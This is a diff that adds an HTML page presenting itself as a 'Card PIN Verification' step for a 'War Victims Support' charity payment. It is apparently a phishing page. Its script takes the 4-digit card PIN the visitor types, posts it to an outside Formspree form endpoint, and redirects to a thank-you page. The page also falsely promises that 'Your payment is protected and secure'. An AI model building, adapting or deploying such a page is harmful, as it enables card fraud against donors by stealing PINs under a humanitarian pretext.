@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Card PIN Verification | War Victims Support</title>
+  <link rel="shortcut icon" href="/assets/logo4.png" type="image/webp" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #f7faff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .pin-container {
+      background: #fff;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.08);
+      max-width: 480px;
+      width: 100%;
+      text-align: center;
+    }
+
+    h2 {
+      font-size: 24px;
+      color: #004080;
+      margin-bottom: 20px;
+    }
+
+    .info {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 30px;
+    }
+
+    .info span {
+      font-weight: 600;
+      color: #004080;
+    }
+
+    input[type="password"] {
+      font-size: 20px;
+      padding: 12px 16px;
+      width: 100%;
+      max-width: 200px;
+      text-align: center;
+      letter-spacing: 8px;
+      border: 2px solid #004080;
+      border-radius: 10px;
+      margin: 0 auto 20px;
+      display: block;
+    }
+
+    button {
+      padding: 12px 25px;
+      font-size: 16px;
+      background-color: #004080;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #002f5e;
+    }
+
+    .note {
+      font-size: 13px;
+      color: #777;
+      margin-top: 25px;
+    }
+    #preloader {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: #ffffff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  transition: opacity 0.4s ease;
+}
+
+.loader {
+  border: 5px solid #e0e0e0;
+  border-top: 5px solid #004080;
+  border-radius: 50%;
+  width: 70px;
+  height: 70px;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+body.loaded #preloader {
+  opacity: 0;
+  pointer-events: none;
+}
+
+  </style>
+</head>
+<body>
+  <div id="preloader">
+    <div class="loader"></div>
+  </div>
+  <div class="pin-container">
+    <h2>Enter Your 4-Digit PIN</h2>
+
+    <div class="info">
+      Cardholder: <span id="cardName">Loading...</span><br/>
+      Amount: <span id="cardAmount">$0</span>
+    </div>
+
+    <form id="Form">
+      <input type="password" maxlength="4" pattern="\d*" placeholder="••••" required name="fournumber" />
+      <button type="submit">Verify & Complete</button>
+    </form>
+
+    <div class="note">Your payment is protected and secure 🔒</div>
+  </div>
+
+  <script>
+
+window.addEventListener('load', function () {
+    document.body.classList.add('loaded');
+  });
+
+document.addEventListener("DOMContentLoaded", function () {
+    const form = document.getElementById("Form");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault(); // Prevent the default form reload
+
+      const formData = new FormData(form);
+      const jsonData = {};
+
+      formData.forEach((value, key) => {
+        jsonData[key] = value;
+      });
+
+      fetch("https://formspree.io/f/mdkenbez", { // Replace with your Formspree ID
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(jsonData)
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "Thank-You.html"; // Redirect after submission
+        } else {
+          alert("Payment Details Submission failed. Please try again.");
+        }
+      })
+      .catch(error => {
+        console.error("Submission error:", error);
+        alert("An error occurred while Submitting.");
+      });
+    });
+  });
+
+
+    // Load stored info
+    const name = localStorage.getItem("cardHolder") || "Unknown";
+    const amount = localStorage.getItem("cardAmount") || "0";
+
+    document.getElementById("cardName").textContent = name;
+    document.getElementById("cardAmount").textContent = "$" + amount;
+
+    // Fake verification
+    document.getElementById("pinForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      // // You can add real validation logic here if needed
+      // window.location.href = "thank-you.html"; // Adjust as needed
+    });
+  </script>
+
+</body>
+</html>
